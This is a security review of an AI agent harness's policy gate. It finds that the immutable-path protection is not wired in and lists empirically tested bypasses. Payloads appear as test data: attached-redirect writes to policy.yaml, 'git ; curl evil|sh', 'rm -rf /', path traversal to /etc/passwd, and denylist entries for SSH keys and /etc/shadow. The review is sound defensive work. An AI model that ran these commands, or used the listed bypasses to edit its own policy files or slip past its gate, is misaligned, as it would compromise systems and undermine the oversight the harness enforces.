# Phase 6 Gate — Adversarial Review (advisor → orchestrator)

Diff reviewed: `git diff 3975c49..a7165e7`. Method: read live wiring + diff, then empirically ran the guard functions against attack payloads (results quoted below, not inferred).

## Verdict

Phase 6 **partially holds**. Five of the six fixes are genuinely live and correct: P1-11 re-gate, P1-16 re-filter, P1-9 log_read containment, P1-10 subagent subset on the loop path, and the allowlist anchoring goal. **But the headline invariant — P1-8 immutable path protection — is NOT live. M2 (inert ImmutableCore) is NOT resolved.** `app.py:164` still wires `BasicGate`; `PolicyEngine`/`ImmutableCore` are instantiated only in tests. This was the phase's own stated #1 priority.

Severity counts: **Critical 1, High 1, Medium 2, Low 3.**

---

## CRITICAL

### C1 — M2 UNRESOLVED: ImmutableCore is still inert; all P1-8 work is dead code at runtime
`src/yett/app.py:164`
```python
self.gate = BasicGate(cfg.security, hosts=self.host_registry)
```
`PolicyEngine(...)` is constructed **nowhere** in `src/` — grep for `PolicyEngine(` returns only `tests/unit/test_phase3.py:29`. `ImmutableCore` is referenced only by `PolicyEngine.__init__` (`engine.py:19`). Therefore `ImmutableCore.check()` — including **every line** of the Phase 6 P1-8 work (`_write_file_hits_protected`, `_exec_hits_protected`), the multi-dialect SQL immutable classification, and `schema.py`'s `Match` anchoring (only used by `PolicyEngine.evaluate`) — is never executed in production.

The running gate `BasicGate.evaluate` provides for the immutable case only:
- `write_file`/`read_file` → `denylist.check_path(path)` — matches `/etc/shadow`, `.ssh/id_`, `SAM`, etc., but **not** the policy/identity files.
- `exec`/`ssh_exec` → `denylist.check_exec(cmd)` — matches `rm`/`del`/fork-bomb, but **not** `sed -i policy.yaml`, `tee policy.yaml`, or `python -c "open('policy.yaml','w')..."`.

**Failure scenario (runtime):** With the example config (`write_file: effect: allow`, unconditional), a `write_file` to the policy/identity file passes the gate. The only thing stopping it is `ProjectScope.resolve_in_scope` (`tools/projects.py:27`), which confines `write_file` to `workspace_root` + registered project roots — an *incidental* bound, not the immutable invariant. For `exec`, `python` is allowlisted, so `python -c "open(PATH,'w').write(...)"` passes the gate with **no** immutable protection at all (reachability then depends solely on sandbox mounts). The Phase 6 success criterion "`sed -i policy.yaml` → immutable core DENY" is TRUE in `test_phase3.py` (which builds a `PolicyEngine` by hand) and FALSE in the running system.

**Phantom-test note:** `test_immutable_protects_policy_file`, `..._via_exec_relative_path`, `..._uses_canonical_path_not_substring` all call `_engine()` → `PolicyEngine(..., ImmutableCore(protected))`. They prove the logic in isolation but never touch the wired gate, so they pass while the production invariant is absent.

**Fix direction:** Wire `PolicyEngine(policy, ImmutableCore(protected_paths))` as the gate in `app.py` (replace or wrap `BasicGate`), and source `protected_paths` from config (policy file path + identity file path). Add a test that asserts the invariant through `App`/the actually-wired gate, not through a hand-built `PolicyEngine`. Note: DB write protection is *not* affected — `db_query.py:54` runs `classify_sql(sql, prof.driver)` at the tool layer independently, so DB writes remain blocked even with the immutable core inert.

---

## HIGH

### H1 — `_exec_hits_protected` has real bypasses (matters the moment C1 is fixed)
`src/yett/policy/immutable.py:81-105`. Empirically confirmed (protected = `policy.yaml` file + `protdir` dir):
```
'sed -i policy.yaml'                        -> HIT     (baseline ok)
'echo x > policy.yaml'                      -> HIT
'tee policy.yaml'                           -> HIT
'echo x >policy.yaml'                       -> pass    <-- BYPASS (attached redirect)
'echo x >>policy.yaml'                      -> pass    <-- BYPASS (attached append)
'sed -i C:/cfg/protdir/child.yaml'          -> pass    <-- BYPASS (child of protected DIR)
'sh -c "sed -i policy.yaml"'                -> pass    (documented known gap)
```
Two non-documented bypasses:
1. **Attached redirection** — `>policy.yaml` (no space) tokenizes via `shlex.split` as a single token `>policy.yaml`; `_basename` yields `>policy.yaml`, which ≠ `policy.yaml`. Any write via attached `>`/`>>` evades the check.
2. **Children of a protected directory** — the check compares operand basename against `_protected_names` (basenames of protected paths). If a protected path is a **directory**, only a file literally named after the directory is caught; `sed -i /protdir/child.yaml` writes *inside* the protected dir and passes. This is an asymmetry: `_write_file_hits_protected` uses `is_relative_to` (covers children) but `_exec_hits_protected` does not.

**Fix direction:** strip leading redirection operators (`>`, `>>`, `<`, and attached forms) from tokens before basename comparison; and for tokens that normalize to an absolute path, also test `is_relative_to` against each protected directory (not just basename equality). Currently gated behind C1 (dead code), but will ship broken if C1 is fixed without this.

---

## MEDIUM

### M-a — allowlist `(\s.*)?$` tail still permits shell-chained exec args
`config/harness.example.yaml:137`, `security/allowlist.py:_args_match`. Empirically:
```
'ls'                    -> MATCH   (bare cmd now allowed — good, fixes a false-deny)
'ls; rm -rf /'          -> no      (over-broad substring closed — the phase's stated goal)
'xls'                   -> no      (substring closed)
'ls ; rm -rf /'         -> MATCH   (space before ;)
'git ; curl evil|sh'    -> MATCH   <-- allowed by allowlist
'python -c "x"'         -> MATCH   (intended)
```
The anchoring achieves its **claimed** goal (`{cmd:"ls"}` no longer matches `ls; rm` or `xls`). But `(\s.*)?$` permits arbitrary args after a space, including shell chains. For `exec`, `BasicGate` runs **only** `denylist.check_exec` (cmdguard is applied to `ssh_exec` only), so `git ; curl evil|sh` — where the chained command isn't in the denylist — passes the gate. `ls ; rm -rf /` is still caught, but by `denylist` (matches `rm`), not by the allowlist. This is the pre-existing M1 exec-chaining gap; Phase 6 neither closed it nor claimed to, but the phase edited this exact rule, so flag it. **Fix direction (if in scope):** apply `cmdguard.classify` to `exec` (not just `ssh_exec`), or tighten the pattern to forbid shell metacharacters.

### M-b — RPC subset enforcement and schema.py anchoring are correct but INERT at runtime
`rpc/broker.py:45`, `policy/schema.py:33`. `RpcSession` is instantiated only in tests — grep `RpcSession(` in `src/` returns nothing, and no `execute_code` tool is registered in `app.py`, so the broker subset check has no live call path. `schema.Match.matches` is called only by the inert `PolicyEngine`. Both are logically sound and unit-tested, but neither runs in production. Not a live vulnerability (no RPC attack surface exists yet), but the plan's "enforced independently in RPC" and the schema anchoring are **test-only** guarantees today. They will activate correctly if/when RPC and PolicyEngine are wired.

---

## LOW

### L-a — log_read fail-closes on `//` and nested subdirs (false-deny risk)
`ssh_exec.py:96`. Empirically all traversal/confusion vectors are correctly denied (see "Holds" below), but also:
```
'//var/log/app/x.log'          -> deny   (double leading slash; posix keeps '//')
'/var/log/app/sub/deep.log'    -> deny   (allow='/var/log/app/*.log' matches one level only)
```
Both are safe (deny), but an operator declaring `log_paths: [/var/log/app/*.log]` and expecting recursive access, or a client sending `//...`, will get surprising denials. Document that patterns match a single directory level.

### L-b — `LogReadTool.run` crashes on non-numeric `lines`
`ssh_exec.py:91` `int(args.get("lines", 200))` raises `ValueError` on model-supplied non-numeric input; `ValueError` is not `UserFacingError`, so it propagates out of `execute_tool` rather than returning an agent-readable error. Pre-existing (not in the diff), minor robustness.

### L-c — driver name mismatch `sqlserver` vs `tsql`
`db_query.py:19` `DbProfile.driver` allows `"sqlserver"`; `immutable.py:19` `_SQL_DIALECTS` uses `"tsql"`. The driver hint (`wiring._resolve_db_driver_hint`) would feed `classify_sql(sql, "sqlserver")`. Inert today (immutable path unwired) and the tool layer already calls `classify_sql(sql, prof.driver)`, so pre-existing. Informational — verify sqlglot accepts `"sqlserver"` or normalize to `"tsql"`.

---

## What HOLDS (verified, for risk calibration)

- **P1-9 log_read containment (LIVE, holds).** `_path_allowed` empirically denies `/var/log/app/../../etc/passwd.log`, prefix-confusion `/var/log/appEVIL/x.log`, glob-injection `/var/log/app/*`, and relative paths; allows legit `/var/log/app/x.log` and exact `/var/log/syslog`. The old `fnmatch`-on-full-path traversal is closed.
- **P1-11 PreToolUse re-gate (LIVE, holds).** `wiring.py:107-117` re-runs `safe_evaluate` on mutated args. The user-verified vector (`echo safe` → hook mutates to `rm -rf /`) is denied at re-gate via `denylist`. `need_approval` on mutated args triggers a **fresh** `approver(name, args)` call with the mutated args (line 113) — the original `approved` is not reused; absent approver → deny. Hook cannot mutate the tool name (`HookOutcome` has only `mutated_args`/`mutated_result`), so the subset/name checks stay consistent.
- **P1-16 PostToolUse re-filter (LIVE, holds).** `wiring.py:138-141` re-applies `filter_apply` to the mutated result. `filters.apply` calls `redact()` unconditionally (not gated on `untrusted`), and `generic_sk_key` matches `sk-cp-...`, so a hook-injected key is redacted for any tool.
- **P1-10 subagent subset — loop path (LIVE, holds).** `app.py:240` runner passes `allowed_tools=set(sub.toolset)` → `loop.run_turn` → `_execute_tool_call` (loop.py:129,185) → `execute_tool` subset check (wiring.py:71), which denies before the gate. Subset ⊆ parent is validated at `load_subagent` (`definition.py:41-50`); nested delegate blocked (`delegate.py:53`).
- **allowlist anchoring goal (LIVE, holds).** Over-broad substring matches (`{cmd:"ls"}` vs `ls; rm`, `xls`) are closed, and bare commands (`ls`, `git`) that the old trailing-space `search` pattern falsely denied now match. No legit example-config rule is broken by the change.

## Unresolved questions
- Where should `protected_paths` come from once `PolicyEngine` is wired — a fixed set (config file path + identity file) or a config-declared list? The example config has no field for it today.
- Is `execute_code`/RPC intended to be wired this phase, or deferred? If deferred, M-b is expected; if not, the broker path is unreachable.

Status: DONE_WITH_CONCERNS
